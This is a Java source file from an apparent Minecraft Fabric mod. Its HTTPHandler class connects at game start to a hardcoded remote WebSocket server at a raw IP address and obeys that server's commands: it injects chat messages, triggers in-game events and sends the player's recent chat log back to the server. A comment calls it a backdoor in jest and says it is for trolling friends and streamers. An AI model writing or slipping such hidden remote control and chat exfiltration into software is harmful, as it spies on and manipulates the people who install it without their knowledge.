package com.pryzmm.splitself.http;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.pryzmm.splitself.packet.packets.EventPacket;
import com.pryzmm.splitself.packet.packets.PartyTimePacket;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayNetworking;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.text.Text;
import java.net.URI;
import java.net.URISyntaxException;

public class HTTPHandler {

    // IT'S NOT A BACKDOOR I SWEAR *cough* aqualoco *cough*
    // trolling friends and streamers is just fun :3

    public static MinecraftClient client;
    public static String clientID;
    public static WebSocketHook socket;

    public static void start(MinecraftClient c) {
        client = c;
        clientID = c.getGameProfile().getId().toString();
        try {
            socket = new WebSocketHook(new URI("ws://144.126.158.38/ws"));
            socket.connect();
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }

    static void handleMessage(String message) {
        ClientPlayerEntity player = MinecraftClient.getInstance().player;
        if (player != null && MinecraftClient.getInstance().world != null) {
            if (message.startsWith("message:")) {
                String text = message.substring(8);
                message = text.replace("{user}", player.getName().getString());
                player.sendMessage(Text.literal(message));
            } else if (message.startsWith("event:")) {
                String event = message.substring(6);
                ClientPlayNetworking.send(new EventPacket(event));
            } else if (message.equals("get_chats")) {
                JsonObject response = new JsonObject();
                response.addProperty("type", "chats");
                JsonArray arr = new JsonArray();
                for (String line : ChatLogBuffer.getRecent()) {
                    arr.add(line);
                }
                response.add("messages", arr);
                HTTPHandler.socket.send(response.toString());
            } else if (message.equals("party")) {
                ClientPlayNetworking.send(new PartyTimePacket("normal"));
            } else if (message.equals("caramelldansen")) {
                ClientPlayNetworking.send(new PartyTimePacket("caramelldansen"));
            }
        }
    }
}